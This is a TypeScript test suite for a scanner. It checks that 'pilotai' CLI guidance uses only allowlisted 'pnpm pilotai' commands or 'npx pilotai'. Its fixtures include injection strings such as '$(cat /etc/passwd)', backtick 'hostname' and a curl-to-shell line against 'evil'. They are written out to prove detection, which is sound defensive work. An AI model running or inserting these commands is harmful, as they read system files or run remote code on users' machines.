...
const PNPM_ALLOWLIST = new Set<string>([
  ...
  "pnpm pilotai feedback report",
  "pnpm pilotai feedback report --payloads",
  "pnpm pilotai feedback export",
  "pnpm pilotai instance settings:experimental",
  "pnpm pilotai worktree ensure-seeded",
...
function recommendsBrokenExecForm(line: string): boolean {
  if (!line.includes("pnpm exec pilotai")) return false;
...
describe("pilotai CLI invocation safety", () => {
  it("allows only exact-allowlist pnpm pilotai commands on every guidance surface", () => {
    const offenders = scanForOffenders();
    expect(
      offenders,
      `Each pnpm pilotai line must match an exact allowlist entry, else use ` +
        `npx pilotai (or the direct-exec form for local source):\n${offenders.join("\n")}`,
    ).toEqual([]);
  });

  it("never recommends the broken pnpm exec pilotai form", () => {
    const offenders = scanForBrokenExecForm();
    expect(
      offenders,
      `\`pnpm exec pilotai\` does not resolve the CLI binary; use \`npx pilotai\`:\n${offenders.join("\n")}`,
    ).toEqual([]);
  });
  ...
  it("flags a value-bearing option that the old flag list omitted", () => {
    ...
    expect(scanText("doc/E.md", "pnpm pilotai doctor --config ./scratch.json")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai run --data-dir ./tmp/dev")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai run --instance dev")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai run --bind tailnet")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai onboard --yes --bind lan")).toHaveLength(1);
  });

  it("flags a context-profile value and every worktree path/ref/id/name option", () => {
    expect(scanText("doc/E.md", "pnpm pilotai context use default")).toHaveLength(1);
    // Path, ref, id, and name options on worktree commands.
    expect(scanText("doc/E.md", "pnpm pilotai worktree repair --branch PIL-1-x")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai worktree:make my-feature --start-point origin/main")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai worktree init --from-config ~/.pilot/config.json")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai worktree reseed --to PIL-1-x")).toHaveLength(1);
  });
  ...
  it("does not let an npx mention on the same line suppress detection", () => {
    ...
    const mixed = "Prefer npx pilotai, but pnpm pilotai issue create --title x also works.";
  ...
  it("rejects a command-substitution or variable span in a recommended command", () => {
    ...
    expect(scanText("doc/E.md", "pnpm pilotai allowed-hostname `hostname`")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai issue create --title $(cat /etc/passwd)")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm pilotai run --instance $INSTANCE")).toHaveLength(1);
    // A literal command wrapped in $( ) is still an offender.
    expect(scanText("doc/E.md", 'eval "$(pnpm pilotai worktree env)"')).toHaveLength(1);
  });
  ...
  it("flags an allowlisted prefix followed by a quoted or backtick suffix", () => {
    ...
    expect(scanText("doc/E.md", 'pnpm pilotai run "$(cat /etc/passwd)"')).toHaveLength(1);
    expect(scanText("doc/E.md", 'pnpm pilotai doctor "$HOME/scratch.json"')).toHaveLength(1);
    // (b) A backtick-delimited suffix after the allowlisted command.
    expect(scanText("doc/E.md", "pnpm pilotai run `hostname`")).toHaveLength(1);
    // A single-quoted suffix is also part of the full command.
    expect(scanText("doc/E.md", "pnpm pilotai onboard 'extra value'")).toHaveLength(1);
  });
  ...
  it("fails closed on a leading unmatched double quote before the marker", () => {
    ...
    const line = 'some prose with one " quote then pnpm pilotai run "$(dangerous)"';
    expect(scanText("doc/E.md", line)).toHaveLength(1);
    // The same shape with a doctor prefix and a `$VAR` suffix.
    const varLine = 'a stray " quote and pnpm pilotai doctor "$HOME/x"';
  ...
  it("does not let an escaped delimiter before the marker open a span", () => {
    ...
    const escapedQuote = 'a label \\" then pnpm pilotai run "$(dangerous)"';
    expect(scanText("doc/E.md", escapedQuote)).toHaveLength(1);
    const escapedTick = "a label \\` then pnpm pilotai run `hostname`";
    ...
    const adjacentEscaped = '\\"pnpm pilotai run "$(dangerous)"';
  ...
  it("still trusts a span in its proven literal context", () => {
    ...
    expect(scanText("doc/E.md", "Run `pnpm pilotai run` to start.")).toEqual([]);
    expect(scanText("config/example.ts", '  command: "pnpm pilotai onboard --yes --run",')).toEqual([]);
    expect(scanText("doc/E.md", "Run `$ pnpm pilotai doctor` to check.")).toEqual([]);
  });
  ...
  it("fails closed on a shell eval that concatenates a quoted form with a substitution", () => {
    ...
    const shell = 'eval "pnpm pilotai run"$(curl http://evil/x | sh)';
  ...
  it("fails closed on a quoted residual in a Markdown line", () => {
    ...
    const md = 'Run "pnpm pilotai run"$(cat /etc/passwd) to start.';
  ...
  it("fails closed on a TypeScript quote span that a concatenation or a substitution follows", () => {
    ...
    const concat = 'const cmd = "pnpm pilotai run" + userInput;';
    expect(scanText("src/build-cmd.ts", concat)).toHaveLength(1);
    const substitution = 'const cmd = "pnpm pilotai run"$(inject);';
  ...
  it("fails closed on an allowlisted prefix joined with a tail in an array literal", () => {
    ...
    const source =
      'const command = ["pnpm pilotai run", userControlledTail].join("");';
  ...
  it("fails closed on an allowlisted prefix passed as a call argument with a tail", () => {
    ...
    const source = 'const command = buildCommand("pnpm pilotai run", tail);';
    const offenders = scanText("src/build-command.ts", source);
    expect(offenders).toHaveLength(1);
  });
  ...
  it("flags an allowlisted prefix with a backtick suffix on a continued line", () => {
    ...
    const quoted = ["pnpm pilotai doctor \\", '  --config "$(cat secret)"'].join("\n");
    expect(scanText("doc/EXAMPLE.md", quoted)).toHaveLength(1);
    const backtick = ["pnpm pilotai run \\", "  `hostname`"].join("\n");
  ...
  it("allows an exact allowlist entry and a bare documentation mention", () => {
    expect(scanText("doc/E.md", "pnpm pilotai run")).toEqual([]);
    expect(scanText("doc/E.md", "pnpm pilotai worktree env --json")).toEqual([]);
    expect(scanText("doc/E.md", "pnpm pilotai configure --section server")).toEqual([]);
    // A prose mention inside backticks is not a runnable command.
    expect(scanText("doc/E.md", "Do not use `pnpm pilotai` for a content-bearing argument.")).toEqual([]);
    expect(scanText("doc/E.md", "The `pnpm pilotai <command> <args>` form is unsafe.")).toEqual([]);
  });
  ...
  it("emits a static, non-interpolated safe form from the private-hostname guard messages", () => {
    ...
    expect(source).toContain("run npx pilotai allowed-hostname <host>");
    expect(source).not.toContain("allowed-hostname ${hostname}");
    expect(source).not.toContain("pnpm pilotai allowed-hostname");
    expect(source).not.toContain("pnpm exec pilotai allowed-hostname");
  });
  ...
  it("emits a static, non-interpolated safe form from the onboarding access diagnostics", () => {
    ...
    expect(source).not.toMatch(/pnpm pilotai allowed-hostname/);
    expect(source).not.toContain("pnpm exec pilotai allowed-hostname");
    expect(source).toContain("npx pilotai allowed-hostname <host>");
  ...
  it("emits the safe form in the generated company-export README", () => {
    ...
    expect(readme).toContain("npx pilotai company import this-github-url-or-folder");
    expect(readme).not.toContain("pnpm pilotai company import");
    expect(readme).not.toContain("pnpm exec pilotai company import");
  });

  it("emits the safe form in the company-export preview builder", () => {
    const source = read("ui/src/pages/CompanyExport.tsx");
    expect(source).not.toContain("pnpm pilotai company import");
    expect(source).not.toContain("pnpm exec pilotai company import");
    expect(source).toContain("npx pilotai company import");
  });
  ...
  it("emits the onboard hint from the server startup banner", () => {
    ...
    expect(source).toContain("npx pilotai onboard");
    expect(source).not.toContain("pnpm pilotai onboard");
    expect(source).not.toContain("pnpm exec pilotai onboard");
  });

  it("emits the safe run form from the client connection-error hint", () => {
    const source = read("cli/src/client/http.ts");
    expect(source).toContain("npx pilotai run");
    expect(source).not.toContain("pnpm pilotai run");
  });
  ...
  it("emits the checked-out CLI cleanup form from the env-lab status output", () => {
    ...
    expect(source).not.toContain("pnpm pilotai env-lab");
    // `pnpm exec pilotai` does not resolve the CLI binary. Do not use it.
    expect(source).not.toContain("pnpm exec pilotai env-lab");
  ...
  it("emits the bootstrap fallback command from the UI", () => {
    ...
    expect(source).toContain("npx pilotai auth bootstrap-ceo");
    expect(source).not.toContain("pnpm pilotai auth bootstrap-ceo");
    expect(source).not.toContain("pnpm exec pilotai auth bootstrap-ceo");
  });

  it("emits the setup form from the board skill", () => {
    const source = read("skills/pilot-board/SKILL.md");
    expect(source).toContain("npx pilotai board setup");
    expect(source).not.toContain("pnpm pilotai board setup");
    expect(source).not.toContain("pnpm exec pilotai board setup");
  });
  ...
  it("documents the safe form in doc/CLI.md", () => {
    ...
    expect(cli).toContain("npx pilotai");
  ...
  it("documents offline and air-gapped use with a safe cache-only form", () => {
    ...
    expect(subsection).toContain("npx --offline pilotai");
    ...
    for (const line of subsection.split("\n")) {
      expect(line).not.toContain("pnpm exec pilotai");
      if (line.includes("pnpm pilotai")) {
  ...
  it("documents the safe form in the agent-facing skill", () => {
    const skill = read("skills/pilot/SKILL.md");
    expect(skill).toContain("CLI safety");
    expect(skill).toContain("npx pilotai");
    expect(skill).toContain("Do not use `pnpm pilotai`");
  });

  // ── Backslash line continuation ──────────────────────────────────────────

  it("flags a content-bearing pnpm pilotai command split across continued lines", () => {
    const source = [
      "```sh",
      "pnpm pilotai issue create \\",
  ...
  it("flags a continued command whose only content-bearing flag sits on the last line", () => {
    const source = [
      "pnpm pilotai worktree init \\",
      "  --force \\",
      "  --name PIL-000-example",
    ].join("\n");
    const offenders = scanText("doc/EXAMPLE.md", source);
    expect(offenders).toHaveLength(1);
    expect(offenders[0]).toContain("doc/EXAMPLE.md:1:");
  ...
  it("does not flag a continued npx pilotai command", () => {
    const source = [
      "npx pilotai issue create \\",
      "  --company-id <company-id> \\",
  ...
  it("does not flag a continued pnpm pilotai command that stays on the allowlist", () => {
    const source = [
      "pnpm pilotai env-lab \\",
      "  status \\",
      "  --json",
    ].join("\n");
    expect(scanText("doc/EXAMPLE.md", source)).toEqual([]);
  ...
  it("flags a recommended pnpm exec pilotai line but skips a warning line", () => {
    expect(recommendsBrokenExecForm("Run pnpm exec pilotai issue create --title x")).toBe(true);
    expect(
      recommendsBrokenExecForm("`pnpm exec pilotai <command> <args>` — broken. Do not use it."),
    ).toBe(false);
  });
});
